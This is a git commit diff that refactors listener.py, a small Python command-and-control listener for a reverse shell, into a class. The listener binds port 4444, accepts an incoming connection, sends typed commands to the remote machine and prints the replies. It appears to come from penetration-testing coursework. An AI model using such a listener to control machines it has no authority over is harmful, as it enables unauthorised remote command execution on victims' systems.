f494cee7f50e0cfc4a32cb1c3832b2d32d40a7d7
kali-ninja <kali-ninja@kali-ninja.kali-ninja>
2025-03-29 22:50:43 +0100

    wip c4

--- listener.py
+++ listener.py
@@ -1,16 +1,23 @@
 #!/usr/bin/ env python
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("xx.x.x.xx", 4444))
-listener.listen(0)
-print("[+] Waiting for connection")
-connection, address = listener.accept()
-print("[+] Got a connection")
 
-while True:
-    command = raw_input(">> ")
-    connection.send(command)
-    result = connection.recv(1024)
-    print(result)
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from " + str(address))
+
+    def execute_remotely(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = raw_input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
